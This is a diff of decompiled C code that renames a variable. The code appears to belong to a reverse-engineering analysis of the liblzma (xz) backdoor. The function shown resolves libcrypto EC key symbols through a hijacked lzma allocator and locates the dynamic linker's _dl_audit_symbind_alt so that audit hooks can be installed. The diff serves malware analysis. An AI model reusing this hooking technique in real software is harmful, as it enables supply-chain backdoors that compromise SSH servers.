@@ -30,7 +30,7 @@ BOOL find_dl_audit_offsets
   char *libcrypto_name_bytes;
   BOOL success;
   lzma_allocator *allocator;
-  Elf64_Sym *pEVar9;
+  Elf64_Sym *symbol_entry;
   pfn_EVP_PKEY_free_t evp_pkey_free_stub;
   pfn_EC_KEY_get0_group_t ec_group_stub;
   pfn_EVP_CIPHER_CTX_free_t cipher_ctx_free_stub;
@@ -45,10 +45,10 @@ BOOL find_dl_audit_offsets
     allocator = get_lzma_allocator();
     libcrypto_info = data->elf_handles->libcrypto;
     allocator->opaque = libcrypto_info;
-    pEVar9 = elf_symbol_get(libcrypto_info,STR_EC_POINT_point2oct,0);
+    symbol_entry = elf_symbol_get(libcrypto_info,STR_EC_POINT_point2oct,0);
     if (data->elf_handles->liblzma->gnurelro_present != FALSE) {
-      if (pEVar9 != (Elf64_Sym *)0x0) {
-        symbol_offset = pEVar9->st_value;
+      if (symbol_entry != (Elf64_Sym *)0x0) {
+        symbol_offset = symbol_entry->st_value;
         libcrypto_ehdr = data->elf_handles->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
         imported_funcs->EC_POINT_point2oct = (pfn_EC_POINT_point2oct_t)(libcrypto_ehdr->e_ident + symbol_offset);
@@ -58,25 +58,25 @@ BOOL find_dl_audit_offsets
       if (evp_pkey_free_stub != (pfn_EVP_PKEY_free_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
-      pEVar9 = elf_symbol_get(data->elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
+      symbol_entry = elf_symbol_get(data->elf_handles->libcrypto,STR_EC_KEY_get0_public_key,0);
       ec_group_stub = (pfn_EC_KEY_get0_group_t)lzma_alloc(0x7e8,allocator);
       imported_funcs->EC_KEY_get0_group = ec_group_stub;
       if (ec_group_stub != (pfn_EC_KEY_get0_group_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       elf_handles = data->elf_handles;
-      if (pEVar9 != (Elf64_Sym *)0x0) {
-        symbol_offset = pEVar9->st_value;
+      if (symbol_entry != (Elf64_Sym *)0x0) {
+        symbol_offset = symbol_entry->st_value;
         libcrypto_ehdr = elf_handles->libcrypto->elfbase;
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
         imported_funcs->EC_KEY_get0_public_key =
              (pfn_EC_KEY_get0_public_key_t)(libcrypto_ehdr->e_ident + symbol_offset);
       }
-      pEVar9 = elf_symbol_get(elf_handles->dynamic_linker,STR_dl_audit_symbind_alt,0);
-      if (pEVar9 != (Elf64_Sym *)0x0) {
+      symbol_entry = elf_symbol_get(elf_handles->dynamic_linker,STR_dl_audit_symbind_alt,0);
+      if (symbol_entry != (Elf64_Sym *)0x0) {
         libcrypto_info = data->elf_handles->dynamic_linker;
-        size = pEVar9->st_size;
-        audit_symbol_vaddr = libcrypto_info->elfbase->e_ident + pEVar9->st_value;
+        size = symbol_entry->st_size;
+        audit_symbol_vaddr = libcrypto_info->elfbase->e_ident + symbol_entry->st_value;
         (hooks->ldso_ctx)._dl_audit_symbind_alt__size = size;
         (hooks->ldso_ctx)._dl_audit_symbind_alt = (dl_audit_symbind_alt_fn)audit_symbol_vaddr;
         success = elf_contains_vaddr(libcrypto_info,audit_symbol_vaddr,size,4);
